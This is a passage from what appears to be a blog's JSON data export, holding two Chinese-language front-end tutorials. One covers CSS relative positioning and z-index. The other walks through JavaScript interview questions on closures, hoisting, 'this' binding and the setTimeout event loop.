class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时若子元素超出父元素部分，因为overflow子元素超出部分将被隐藏； </p>\n<h2 id=\"relative与fixed：\"><a href=\"#relative与fixed：\" class=\"headerlink\" title=\"relative与fixed：\"></a>relative与fixed：</h2><blockquote>\n<p>relative只能限制z-index，对上述其他属性不起作用。  </p>\n</blockquote>\n<h2 id=\"relative与定位\"><a href=\"#relative与定位\" class=\"headerlink\" title=\"relative与定位:\"></a>relative与定位:</h2><h3 id=\"特性：\"><a href=\"#特性：\" class=\"headerlink\" title=\"特性：\"></a>特性：</h3><ul>\n<li>相对自身：</li>\n</ul>\n<blockquote>\n<p>与absolute(相对于非static值的父元素定位)不同，relative相对于其原本位置进行定位。   </p>\n</blockquote>\n<ul>\n<li>无侵入:      </li>\n</ul>\n<p>margin-top与top进行对比<br>code：    </p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div1</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: -<span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">div2</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">\t<span class=\"attribute\">top</span>: -<span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>此时在div1后面的元素会随着div1的变动也随之改变位置，而div2后面的元素并不会改变位置。 </p>\n</blockquote>\n<p>注：若top/bottom和left/right对立属性同时存在时的表现：<br>top起作用而bottom不起作用；<br>left起作用而right不起作用。  </p>\n<h2 id=\"relative与层级关系：\"><a href=\"#relative与层级关系：\" class=\"headerlink\" title=\"relative与层级关系：\"></a>relative与层级关系：</h2><h3 id=\"提高层叠上下文：\"><a href=\"#提高层叠上下文：\" class=\"headerlink\" title=\"提高层叠上下文：\"></a>提高层叠上下文：</h3><blockquote>\n<p>在层叠底部的元素添加relative属性值可将该元素置顶。</p>\n</blockquote>\n<h2 id=\"relative的最小化影响原则：\"><a href=\"#relative的最小化影响原则：\" class=\"headerlink\" title=\"relative的最小化影响原则：\"></a>relative的最小化影响原则：</h2><p>即尽量降低relative属性对其他元素或布局的潜在影响。 </p>\n<h4 id=\"1-尽量避免使用relative：\"><a href=\"#1-尽量避免使用relative：\" class=\"headerlink\" title=\"1. 尽量避免使用relative：\"></a>1. 尽量避免使用relative：</h4><blockquote>\n<p>即避免使用relative属性的父元素来限制使用absolute属性的子元素。  </p>\n</blockquote>\n<h4 id=\"2-relative最小化：\"><a href=\"#2-relative最小化：\" class=\"headerlink\" title=\"2. relative最小化：\"></a>2. relative最小化：</h4><p>code:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"postion:relative;\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position:absolute;top:0;right:0;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可改为： </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"postion:relative;\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position:absolute;top:0;right:0;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这样可避免因为relative带来的子元素div层级关系的问题。</p>\n</blockquote>\n","excerpt":"","more":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"relative与absolute：\"><a href=\"#relative与absolute：\" class=\"headerlink\" title=\"relative与absolute：\"></a>relative与absolute：</h2><ul>\n<li>限制left/top/right/bottom定位:</li>\n</ul>\n<blockquote>\n<p>absolute绝对定位是相对于非static值的父元素  </p>\n</blockquote>\n<ul>\n<li>限制z-index层级:</li>\n</ul>\n<p>code：  </p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.div1&#123;    </span><br><span class=\"line\">\tposition:absolute;    </span><br><span class=\"line\">\tz-index:1;</span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\">.div2&#123;</span><br><span class=\"line\">\tposition:absolute;</span><br><span class=\"line\">\tz-index:2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```   </span><br><span class=\"line\">此时div2层级比div1高，优先显示.  </span><br><span class=\"line\">然而:  </span><br><span class=\"line\"></span><br><span class=\"line\">```css  </span><br><span class=\"line\">//less</span><br><span class=\"line\">.parent1&#123;     </span><br><span class=\"line\">\tposition:relative;</span><br><span class=\"line\">\tz-index:2;</span><br><span class=\"line\">\t.child1&#123;</span><br><span class=\"line\">\t\tpostion:absolute;</span><br><span class=\"line\">\t\tz-index:1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">.parent2&#123;     </span><br><span class=\"line\">\tposition:relative;</span><br><span class=\"line\">\tz-index:1;</span><br><span class=\"line\">\t.child2&#123;</span><br><span class=\"line\">\t\tpostion:absolute;</span><br><span class=\"line\">\t\tz-index:2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时尽管child1的z-index比child2小，但是child1依然在child2上面.</p>\n<ul>\n<li>限制在overflow下:  </li>\n</ul>\n<p>code:  </p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.parent&#123;</span><br><span class=\"line\">\toverflow:hidden;</span><br><span class=\"line\">\t.child&#123;</span><br><span class=\"line\">\t\tposition:absolute;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">``` </span><br><span class=\"line\">若子元素超出父元素部分，overflow并不会对其进行限制；</span><br><span class=\"line\"></span><br><span class=\"line\">```css</span><br><span class=\"line\">.parent&#123;</span><br><span class=\"line\">\toverflow:hidden;</span><br><span class=\"line\">\tposition:relative;</span><br><span class=\"line\">\t.child&#123;</span><br><span class=\"line\">\t\tposition:absolute;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时若子元素超出父元素部分，因为overflow子元素超出部分将被隐藏； </p>\n<h2 id=\"relative与fixed：\"><a href=\"#relative与fixed：\" class=\"headerlink\" title=\"relative与fixed：\"></a>relative与fixed：</h2><blockquote>\n<p>relative只能限制z-index，对上述其他属性不起作用。  </p>\n</blockquote>\n<h2 id=\"relative与定位\"><a href=\"#relative与定位\" class=\"headerlink\" title=\"relative与定位:\"></a>relative与定位:</h2><h3 id=\"特性：\"><a href=\"#特性：\" class=\"headerlink\" title=\"特性：\"></a>特性：</h3><ul>\n<li>相对自身：</li>\n</ul>\n<blockquote>\n<p>与absolute(相对于非static值的父元素定位)不同，relative相对于其原本位置进行定位。   </p>\n</blockquote>\n<ul>\n<li>无侵入:      </li>\n</ul>\n<p>margin-top与top进行对比<br>code：    </p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div1</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: -<span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">div2</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">\t<span class=\"attribute\">top</span>: -<span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>此时在div1后面的元素会随着div1的变动也随之改变位置，而div2后面的元素并不会改变位置。 </p>\n</blockquote>\n<p>注：若top/bottom和left/right对立属性同时存在时的表现：<br>top起作用而bottom不起作用；<br>left起作用而right不起作用。  </p>\n<h2 id=\"relative与层级关系：\"><a href=\"#relative与层级关系：\" class=\"headerlink\" title=\"relative与层级关系：\"></a>relative与层级关系：</h2><h3 id=\"提高层叠上下文：\"><a href=\"#提高层叠上下文：\" class=\"headerlink\" title=\"提高层叠上下文：\"></a>提高层叠上下文：</h3><blockquote>\n<p>在层叠底部的元素添加relative属性值可将该元素置顶。</p>\n</blockquote>\n<h2 id=\"relative的最小化影响原则：\"><a href=\"#relative的最小化影响原则：\" class=\"headerlink\" title=\"relative的最小化影响原则：\"></a>relative的最小化影响原则：</h2><p>即尽量降低relative属性对其他元素或布局的潜在影响。 </p>\n<h4 id=\"1-尽量避免使用relative：\"><a href=\"#1-尽量避免使用relative：\" class=\"headerlink\" title=\"1. 尽量避免使用relative：\"></a>1. 尽量避免使用relative：</h4><blockquote>\n<p>即避免使用relative属性的父元素来限制使用absolute属性的子元素。  </p>\n</blockquote>\n<h4 id=\"2-relative最小化：\"><a href=\"#2-relative最小化：\" class=\"headerlink\" title=\"2. relative最小化：\"></a>2. relative最小化：</h4><p>code:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"postion:relative;\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position:absolute;top:0;right:0;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可改为： </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"postion:relative;\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position:absolute;top:0;right:0;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这样可避免因为relative带来的子元素div层级关系的问题。</p>\n</blockquote>\n"},{"layout":"post","title":"「前端 · 面试」记录一些有意思的题目(一)","date":"2016-02-19T04:00:00.000Z","author":"Lindz","header-img":"img/3.jpg","_content":"\n> 本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## 一、var a=[\"a\",\"b\",\"c\",\"d\"] 每过 1 秒 alert 一下数组中的值。\n\n这题乍一看意识到使用闭包，但是难点还要每隔1秒弹出一次。\n常规方法：设置闭包并且设置时间每次增长一秒。\n\n\n```javascript\nvar arr = ['a','b','c','d','e'];\nfor(var i = 0,len = arr.length;i < len; i++){\n\t(function (j) {\n\t\tsetTimeout(function () {\n\t\t\talert(arr[j]);\n\t\t},1000 * (i+1))\n\t})(i);\n}\n```\nES6方法：利用ES6中let块级作用域的特性。\n \n```javascript\nvar arr = ['a','b','c','d','e'];\nfor(let i = 0,len = arr.length;i < len; i++){\n\tsetTimeout(function () {\n \t\talert(arr[i]);\n \t},1000 * (i+1))\n}\n```\n\n## 二、下面程序的执行结果是：\n\n```javascript\nvar name = 'World!';\n(function () {\n\tif (typeof name === 'undefined') {\n\t\tvar name = 'Jack';\n\t\tconsole.log('Goodbye ' + name);\n\t} else {\n\t\tconsole.log('Hello ' + name);\n\t}\n})();\n```\n这题乍一看容易认为输出\"Hello World!\"，其实不然，因为var name = 'Jack',存在变量提升，故这段代码在执行的时候会被解析成：\n\n```javascript\nvar name = 'World!';\n(function () {\n\tvar name;\n\tif (typeof name === 'undefined') {\n\t\tname = 'Jack';\n      \tconsole.log('Goodbye ' + name);\n\t} else {\n      \tconsole.log('Hello ' + name);\n\t}\n})();\n```\n故执行结果为：\"Goodbye Jack\";若将var name = 'Jack' 的var去掉，则执行结果为Hello World!。\n\n## 三、用CSS实现下面图片：\n\n![triangle](/assets/2016-02-19-record-front-questions/1.png)\n\n实现难点在于上述的三角形，可以使用css中的border来实现：  \n**细节：首先div盒子宽高要设置为0；  \n其次border-top/bottom/left/right来调整三角形，并且其背景色要设置为transparent(透明)而不是white。**\n\n```css\n<title>picture</title>\n<style type=\"text/css\">\n#rectangle{\n    background: #FFF;\n    border: 10px solid #999999;\n    padding:10px;\n    height: 120px;\n    width: 200px;\n}\n#circle{\n    position:absolute;\n    margin-left: 140px;\n    margin-top: 10px;\n    width: 40px;\n    height: 40px;\n    background: #999999; \n    -moz-border-radius: 20px; \n    -webkit-border-radius: 20px; \n    border-radius: 20px;\n}\n#triangle{\n    width: 0; \n    height: 0; \n    position:absolute;\n    margin-top: 40px;\n    border-bottom: 80px solid #999999; \n    border-left: 50px solid transparent; \n    border-right: 70px solid transparent; \n}\n#triangle2{\n    width: 0; \n    height: 0; \n    position:absolute;\n    margin-top: 60px;\n    margin-left: 80px;\n    border-bottom: 60px solid #999999; \n    border-left: 30px solid transparent; \n    border-right: 70px solid transparent; \n}\n</style>\n</head>\n<body>\n<div id=\"rectangle\"><span id=\"circle\"></span><span id=\"triangle\"></span><span id=\"triangle2\"></span></div>\n</body>\n```\n\n## 四、实现下述题目的要求：\n\n```javascript\t\nvar Obj = function(msg){\n\tthis.msg = msg;\n\tthis.shout = function(){\n\t\talert(this.msg);\n\t}\n\tthis.waitAndShout = function(){\n\t\t//隔五秒钟后执行上面的shout方法\n\n\t}\n}\n```\n看到此题容易以为考察setTimeout的用法，答案就写成：\n\n```javascript\nvar Obj = function(msg){\n\tthis.msg = msg;\n   \tthis.shout = function(){\n   \t\talert(this.msg);\n\t}\n   \tthis.waitAndShout = function(){\n   \t\t//隔五秒钟后执行上面的shout方法\n   \t\t\tsetTimeout(function () {\n   \t\t\t\tthis.shout();\n   \t\t\t},5000);\n   \t}\n}\n\nvar obj = new Obj('Jack');\nobj.waitAndShout();\n```\n这样写是错误的，控制台会报错：**Uncaught TypeError: this.shout is not a function(anonymous function) @ test.html:17**  \n事实上setTimeout里面的函数是个匿名函数，此时this指向window，故正确的答案:  \n\n```javascript\nvar Obj = function(msg){\n    this.msg = msg;\n    this.shout = function(){\n        alert(this.msg);\n    }\n    this.waitAndShout = function(){\n        //隔五秒钟后执行上面的shout方法\n        var self = this;\n        setTimeout(function () {\n            self.shout();\n        },5000);\n    }\n}\n\nvar obj = new Obj('Jack');\nobj.waitAndShout();\n```\n\n使用一个self变量来存放this，这样匿名函数就可以用self来访问Obj这个对象了，实现细节不在赘述。  \n**有兴趣的同学可以看:** [JavaScript中的this陷阱的最全收集--没有之一](https://segmentfault.com/a/1190000002640298)\n\n## 五、输出下述代码的执行结果：\n\n```javascript\nvar start = new Date;\nsetTimeout(function(){\n    console.log('fn1');\n}, 20);\nsetTimeout(function(){\n    console.log('fn2');\n}, 30);\nsetTimeout(function(){\n    console.log('another fn2');\n}, 30);\nsetTimeout(function(){\n    console.log('fn3');\n}, 10);\nconsole.log('start while');\nwhile (new Date - start < 1000) {};\nconsole.log('end while');\n```\n要做此题必须理解setTimeout是如何运行的, 简单来说，Javascript执行引擎运行时产生堆(Heap)和栈(Stack)。程序的代码一次进入栈中等待执行，在遇到WebAPIs中规定的事件如(DOM操作，ajax请求，还有setTimeout事件)时，会将这些事件添加到一个任务队列当中，因为Javascript是单线程执行，所以当事件时间到了之后，它先看看主线程中代码是否执行完，若代码还在执行，则阻塞该事件。  \n\n> 即当主线程代码还在执行的情况下会阻塞任务队列里面的事件，即使任务队列里的事件已经达到了可执行阶段 \n\n故前面几个setTimeout事件等待时间只有几十毫秒,但是new Date - start < 1000代码执行阻塞了这些存放在任务队列的事件，当代码执行完毕后，这些事件会按时间顺序依次执行。故正确答案为：  \n\n```javascript\nstart while\nend while\nfn3\nfn1\nfn2\nanother fn2\n```\n更详细的实现细节可以查阅: [【转向Javascript系列】从setTimeout说事件循环模型 | Web前端 腾讯AlloyTeam  Blog | 愿景: 成为地球卓越的Web团队！](http://www.alloyteam.com/2015/10/turning-to-javascript-series-from-settimeout-said-the-event-loop-model/)  \n\n明白上述题目可以试试下面这题，原理相似:\n\n### 对于下列程序运行结果，符合预期的是(单选)：\n\n```javascript\nfunction f1() {\n    console.time('time span');\n}\nfunction f2() {\n    console.timeEnd('time span');\n}\nsetTimeout(f1, 100);\nsetTimeout(f2, 200);\n\nfunction waitForMs(n) {\n    var now = Date.now();\n    while (Date.now() - now < n) {}\n}\n\nwaitForMs(500);\n```\n\n> * A、time span:700.077ms\n> * B、time apan:0.066ms\n> * C、time span:500.077ms\n> * D、time span:100.077ms\n\n正确答案：B\n","source":"_posts/2016-02-19-record-front-questions.md","raw":"---\nlayout:     post\ntitle:      \"「前端 · 面试」记录一些有意思的题目(一)\"\ndate:       2016-02-19 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/3.jpg\"\ntags:\n    - 面试\n---\n\n> 本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## 一、var a=[\"a\",\"b\",\"c\",\"d\"] 每过 1 秒 alert 一下数组中的值。\n\n这题乍一看意识到使用闭包，但是难点还要每隔1秒弹出一次。\n常规方法：设置闭包并且设置时间每次增长一秒。\n\n\n```javascript\nvar arr = ['a','b','c','d','e'];\nfor(var i = 0,len = arr.length;i < len; i++){\n\t(function (j) {\n\t\tsetTimeout(function () {\n\t\t\talert(arr[j]);\n\t\t},1000 * (i+1))\n\t})(i);\n}\n```\nES6方法：利用ES6中let块级作用域的特性。\n \n```javascript\nvar arr = ['a','b','c','d','e'];\nfor(let i = 0,len = arr.length;i < len; i++){\n\tsetTimeout(function () {\n \t\talert(arr[i]);\n \t},1000 * (i+1))\n}\n```\n\n## 二、下面程序的执行结果是：\n\n```javascript\nvar name = 'World!';\n(function () {\n\tif (typeof name === 'undefined') {\n\t\tvar name = 'Jack';\n\t\tconsole.log('Goodbye ' + name);\n\t} else {\n\t\tconsole.log('Hello ' + name);\n\t}\n})();\n```\n这题乍一看容易认为输出\"Hello World!\"，其实不然，因为var name = 'Jack',存在变量提升，故这段代码在执行的时候会被解析成：\n\n```javascript\nvar name = 'World!';\n(function () {\n\tvar name;\n\tif (typeof name === 'undefined') {\n\t\tname = 'Jack';\n      \tconsole.log('Goodbye ' + name);\n\t} else {\n      \tconsole.log('Hello ' + name);\n\t}\n})();\n```\n故执行结果为：\"Goodbye Jack\";若将var name = 'Jack' 的var去掉，则执行结果为Hello World!。\n\n## 三、用CSS实现下面图片：\n\n![triangle](/assets/2016-02-19-record-front-questions/1.png)\n\n实现难点在于上述的三角形，可以使用css中的border来实现：  \n**细节：首先div盒子宽高要设置为0；  \n其次border-top/bottom/left/right来调整三角形，并且其背景色要设置为transparent(透明)而不是white。**\n\n```css\n<title>picture</title>\n<style type=\"text/css\">\n#rectangle{\n    background: #FFF;\n    border: 10px solid #999999;\n    padding:10px;\n    height: 120px;\n    width: 200px;\n}\n#circle{\n    position:absolute;\n    margin-left: 140px;\n    margin-top: 10px;\n    width: 40px;\n    height: 40px;\n    background: #999999; \n    -moz-border-radius: 20px; \n    -webkit-border-radius: 20px; \n    border-radius: 20px;\n}\n#triangle{\n    width: 0; \n    height: 0; \n    position:absolute;\n    margin-top: 40px;\n    border-bottom: 80px solid #999999; \n    border-left: 50px solid transparent; \n    border-right: 70px solid transparent; \n}\n#triangle2{\n    width: 0; \n    height: 0; \n    position:absolute;\n    margin-top: 60px;\n    margin-left: 80px;\n    border-bottom: 60px solid #999999; \n    border-left: 30px solid transparent; \n    border-right: 70px solid transparent; \n}\n</style>\n</head>\n<body>\n<div id=\"rectangle\"><span id=\"circle\"></span><span id=\"triangle\"></span><span id=\"triangle2\"></span></div>\n</body>\n```\n\n## 四、实现下述题目的要求：\n\n```javascript\t\nvar Obj = function(msg){\n\tthis.msg = msg;\n\tthis.shout = function(){\n\t\talert(this.msg);\n\t}\n\tthis.waitAndShout = function(){\n\t\t//隔五秒钟后执行上面的shout方法\n\n\t}\n}\n```\n看到此题容易以为考察setTimeout的用法，答案就写成：\n\n```javascript\nvar Obj = function(msg){\n\tthis.msg = msg;\n   \tthis.shout = function(){\n   \t\talert(this.msg);\n\t}\n   \tthis.waitAndShout = function(){\n   \t\t//隔五秒钟后执行上面的shout方法\n   \t\t\tsetTimeout(function () {\n   \t\t\t\tthis.shout();\n   \t\t\t},5000);\n   \t}\n}\n\nvar obj = new Obj('Jack');\nobj.waitAndShout();\n```\n这样写是错误的，控制台会报错：**Uncaught TypeError: this.shout is not a function(anonymous function) @ test.html:17**  \n事实上setTimeout里面的函数是个匿名函数，此时this指向window，故正确的答案:  \n\n```javascript\nvar Obj = function(msg){\n    this.msg = msg;\n    this.shout = function(){\n        alert(this.msg);\n    }\n    this.waitAndShout = function(){\n        //隔五秒钟后执行上面的shout方法\n        var self = this;\n        setTimeout(function () {\n            self.shout();\n        },5000);\n    }\n}\n\nvar obj = new Obj('Jack');\nobj.waitAndShout();\n```\n\n使用一个self变量来存放this，这样匿名函数就可以用self来访问Obj这个对象了，实现细节不在赘述。  \n**有兴趣的同学可以看:** [JavaScript中的this陷阱的最全收集--没有之一](https://segmentfault.com/a/1190000002640298)\n\n## 五、输出下述代码的执行结果：\n\n```javascript\nvar start = new Date;\nsetTimeout(function(){\n    console.log('fn1');\n}, 20);\nsetTimeout(function(){\n    console.log('fn2');\n}, 30);\nsetTimeout(function(){\n    console.log('another fn2');\n}, 30);\nsetTimeout(function(){\n    console.log('fn3');\n}, 10);\nconsole.log('start while');\nwhile (new Date - start < 1000) {};\nconsole.log('end while');\n```\n要做此题必须理解setTimeout是如何运行的, 简单来说，Javascript执行引擎运行时产生堆(Heap)和栈(Stack)。程序的代码一次进入栈中等待执行，在遇到WebAPIs中规定的事件如(DOM操作，ajax请求，还有setTimeout事件)时，会将这些事件添加到一个任务队列当中，因为Javascript是单线程执行，所以当事件时间到了之后，它先看看主线程中代码是否执行完，若代码还在执行，则阻塞该事件。  \n\n> 即当主线程代码还在执行的情况下会阻塞任务队列里面的事件，即使任务队列里的事件已经达到了可执行阶段 \n\n故前面几个setTimeout事件等待时间只有几十毫秒,但是new Date - start < 1000代码执行阻塞了这些存放在任务队列的事件，当代码执行完毕后，这些事件会按时间顺序依次执行。故正确答案为：  \n\n```javascript\nstart while\nend while\nfn3\nfn1\nfn2\nanother fn2\n```\n更详细的实现细节可以查阅: [【转向Javascript系列】从setTimeout说事件循环模型 | Web前端 腾讯AlloyTeam  Blog | 愿景: 成为地球卓越的Web团队！](http://www.alloyteam.com/2015/10/turning-to-javascript-series-from-settimeout-said-the-event-loop-model/)  \n\n明白上述题目可以试试下面这题，原理相似:\n\n### 对于下列程序运行结果，符合预期的是(单选)：\n\n```javascript\nfunction f1() {\n    console.time('time span');\n}\nfunction f2() {\n    console.timeEnd('time span');\n}\nsetTimeout(f1, 100);\nsetTimeout(f2, 200);\n\nfunction waitForMs(n) {\n    var now = Date.now();\n    while (Date.now() - now < n) {}\n}\n\nwaitForMs(500);\n```\n\n> * A、time span:700.077ms\n> * B、time apan:0.066ms\n> * C、time span:500.077ms\n> * D、time 